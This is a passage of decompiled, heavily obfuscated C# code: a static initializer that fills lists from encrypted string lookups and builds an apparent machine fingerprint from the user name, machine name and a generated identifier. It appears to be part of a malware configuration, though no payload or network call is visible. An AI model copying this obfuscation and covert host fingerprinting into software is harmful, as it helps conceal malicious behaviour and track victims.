			gvCYkntYkqMW(getString_0(107368235)),
			gvCYkntYkqMW(getString_0(107368146)),
			gvCYkntYkqMW(getString_0(107368117)),
			gvCYkntYkqMW(getString_0(107368084)),
			gvCYkntYkqMW(getString_0(107368051)),
			gvCYkntYkqMW(getString_0(107368546)),
			gvCYkntYkqMW(getString_0(107368517)),
			gvCYkntYkqMW(getString_0(107368440)),
			gvCYkntYkqMW(getString_0(107368427)),
			gvCYkntYkqMW(getString_0(107368386)),
			gvCYkntYkqMW(getString_0(107368329)),
			gvCYkntYkqMW(getString_0(107367736)),
			gvCYkntYkqMW(getString_0(107367707)),
			gvCYkntYkqMW(getString_0(107367694))
		};
		tYWpKAuFUmGf = new List<string>
		{
			gvCYkntYkqMW(getString_0(107367653)),
			gvCYkntYkqMW(getString_0(107367572)),
			gvCYkntYkqMW(getString_0(107367555)),
			gvCYkntYkqMW(getString_0(107367986)),
			gvCYkntYkqMW(getString_0(107367969)),
			gvCYkntYkqMW(getString_0(107367872)),
			gvCYkntYkqMW(getString_0(107367795)),
			gvCYkntYkqMW(getString_0(107367222))
		};
		ifTEDxlMnuTZQ = new List<string>
		{
			gvCYkntYkqMW(getString_0(107367165)),
			gvCYkntYkqMW(getString_0(107367132)),
			gvCYkntYkqMW(getString_0(107367119)),
			gvCYkntYkqMW(getString_0(107367038)),
			gvCYkntYkqMW(getString_0(107367517)),
			gvCYkntYkqMW(getString_0(107367500)),
			gvCYkntYkqMW(getString_0(107367423)),
			gvCYkntYkqMW(getString_0(107367390)),
			gvCYkntYkqMW(getString_0(107367357)),
			gvCYkntYkqMW(getString_0(107367324)),
			gvCYkntYkqMW(getString_0(107367291)),
			gvCYkntYkqMW(getString_0(107366746)),
			gvCYkntYkqMW(getString_0(107366705)),
			gvCYkntYkqMW(getString_0(107366696)),
			gvCYkntYkqMW(getString_0(107366619)),
			gvCYkntYkqMW(getString_0(107366586)),
			gvCYkntYkqMW(getString_0(107366545)),
			gvCYkntYkqMW(getString_0(107366544)),
			gvCYkntYkqMW(getString_0(107367015)),
			gvCYkntYkqMW(getString_0(107366942)),
			gvCYkntYkqMW(getString_0(107366909)),
			gvCYkntYkqMW(getString_0(107366868)),
			gvCYkntYkqMW(getString_0(107366835)),
			gvCYkntYkqMW(getString_0(107367165)),
			gvCYkntYkqMW(getString_0(107366826)),
			gvCYkntYkqMW(getString_0(107366785)),
			gvCYkntYkqMW(getString_0(107366196)),
			gvCYkntYkqMW(getString_0(107366163)),
			gvCYkntYkqMW(getString_0(107366154)),
			gvCYkntYkqMW(getString_0(107366113)),
			gvCYkntYkqMW(getString_0(107366048)),
			gvCYkntYkqMW(getString_0(107366007)),
			gvCYkntYkqMW(getString_0(107366510)),
			gvCYkntYkqMW(getString_0(107367132)),
			gvCYkntYkqMW(getString_0(107366469)),
			gvCYkntYkqMW(getString_0(107367119)),
			gvCYkntYkqMW(getString_0(107366436)),
			gvCYkntYkqMW(getString_0(107366403)),
			gvCYkntYkqMW(getString_0(107366330)),
			gvCYkntYkqMW(getString_0(107366297)),
			gvCYkntYkqMW(getString_0(107366288)),
			gvCYkntYkqMW(getString_0(107365735)),
			gvCYkntYkqMW(getString_0(107365702)),
			gvCYkntYkqMW(getString_0(107365669)),
			gvCYkntYkqMW(getString_0(107365596)),
			gvCYkntYkqMW(getString_0(107365555)),
			gvCYkntYkqMW(getString_0(107365546))
		};
		KXhXGePQDEZDL = new List<string>
		{
			gvCYkntYkqMW(jCEtgwbUwXnV(getString_0(107365505))),
			gvCYkntYkqMW(getString_0(107365968)),
			gvCYkntYkqMW(getString_0(107365843)),
			gvCYkntYkqMW(getString_0(107365746)),
			gvCYkntYkqMW(getString_0(107365141)),
			gvCYkntYkqMW(getString_0(107365044)),
			gvCYkntYkqMW(getString_0(107365463)),
			gvCYkntYkqMW(getString_0(107365366)),
			gvCYkntYkqMW(getString_0(107365273)),
			gvCYkntYkqMW(getString_0(107364664)),
			gvCYkntYkqMW(getString_0(107364571)),
			gvCYkntYkqMW(getString_0(107364474)),
			gvCYkntYkqMW(getString_0(107364893)),
			gvCYkntYkqMW(jCEtgwbUwXnV(getString_0(107365505)))
		};
		wkEmfSxwmzT = gvCYkntYkqMW(getString_0(107364796));
		uNUvSMAaNbE = new List<string>
		{
			gvCYkntYkqMW(getString_0(107462507)),
			gvCYkntYkqMW(getString_0(107462313)),
			gvCYkntYkqMW(getString_0(107462631)),
			gvCYkntYkqMW(getString_0(107461925)),
			gvCYkntYkqMW(getString_0(107462243)),
			gvCYkntYkqMW(getString_0(107462049))
		};
		oKdmKTTglf = new List<string>
		{
			gvCYkntYkqMW(getString_0(107461311)),
			gvCYkntYkqMW(getString_0(107461282)),
			gvCYkntYkqMW(getString_0(107461733))
		};
		cjhxiWZpwAn = getString_0(107396844);
		yYAthlfRBbt = getString_0(107396844);
		StkEbImMCbtrgdu = new DateTime(2000, 1, 1);
		LoigGdnjgcUKsiZ = new DateTime(2100, 1, 1);
		OKoHtjQYjxHns = getString_0(107396927);
		PnZVnKFyCNiuKv = getString_0(107378591);
		BRicohgBJnxQ = getString_0(107396844);
		wjIBIUazAZFQ = getString_0(107396844);
		qBEQrrMwITse = getString_0(107396844);
		AIuEhRYiNnYdk = getString_0(107396927);
		CuHkRABBXl = getString_0(107396844);
		bdRzRfVgdufg = getString_0(107396844);
		WIlNSOXrZeC = new List<string>
		{
			getString_0(107396262),
			getString_0(107396488),
			getString_0(107396296),
			getString_0(107395825)
		};
		PIdfVhNVvVogR = getString_0(107396844);
		zshVWAjTCa = getString_0(107461672);
		VUNAdynhoQ = getString_0(107396844);
		cSURllrGISXxER = getString_0(107396844);
		FPngYwpRsvyPHu = getString_0(107396844);
		MpKuXCANucKv = string.Empty;
		VCfxGRKgrJMnuih = getString_0(107396844);
		kQkJNzvKzzqIQaY = getString_0(107396927);
		KBJvdPMmjzTQDS = getString_0(107396927);
		qwKvoNoQFi = getString_0(107461667);
		ZstNmYcaky = getString_0(107461602);
		ocvMNTGTKYpYXC = getString_0(107396844);
		cwapJyBOOyLzU = getString_0(107396927);
		OBXPdvxMybik = getString_0(107396844);
		JJikdGMjNneam = getString_0(107396844);
		okARNIqGXig = getString_0(107396844);
		pZrmcEPHiixji = getString_0(107349685);
		jlAopDBCdV = getString_0(107396844);
		tqiTaLTjAiFsV = getString_0(107396844);
		ntagmnsgvSkoTT = getString_0(107460532);
		VFNHlTCAhVOW = getString_0(107396844);
		QCbYHFYnKsrGh = getString_0(107396844);
		OGrufRdQgWPqA = getString_0(107396927);
		FtfEHcuGYoigQT = getString_0(107396844);
		MvmlvFwyfsdEjaTm = getString_0(107460511);
		FeVyeNgKIlgRZE = getString_0(107396927);
		TJlCZFndoKUA = getString_0(107396927);
		rdyyZAaJuCfFKzJOPg = getString_0(107396844);
		cJaDcuvoWf = getString_0(107396844);
		JuuHnIfwBa = new string[0];
		cdzmoqFlfITSP = getString_0(107396927);
		iRryUAENoXyxNt = true;
		eqYgovaJkUYKPn = getString_0(107396927);
		CVCyEBDPJVibYms = true;
		ZDbHiLoVEkHSf = false;
		gynwAGVYLLHMFI = false;
		gNedWFYXVKDcDY = false;
		vzSBJQFXpb = getString_0(107460498);
		JJYUPCZGaGN = false;
		jMQEiNiMqdQad = false;
		NOsBuCdCpQJFTN = false;
		YgToHXrQdwK = false;
		DCETDGmAEgibl = true;
		kVZoVJTgfl = getString_0(107460477) + Environment.UserName + getString_0(107460496) + Environment.MachineName + getString_0(107459931) + UuDMKkzrJStt.GtkPFNFnFTX() + getString_0(107459926);
		WmRKwcdDWVtNion = false;
		MpxTVcQhNlzAF = new Stopwatch();
		AmOSyvkYqZhk = 0;
		ytQePvltMhp = 0;
		FAXnWIlLgke = false;
		IHjeiOieyeiso = getString_0(107459949) + UuDMKkzrJStt.GtkPFNFnFTX() + getString_0(107459940);
		wKDLKsoOvhGs = new string[1] { getString_0(107459903) };
		qvPWtnGDFercawvHYD = new List<string>();
		ywMnaFcwkyBX = 0;
		ytjIPDBCZRI = new List<string>();
		nEVBfCXOqpRfsLK = new List<string>();
		rxZfFrQVmuwA = new List<string>();
	}
}
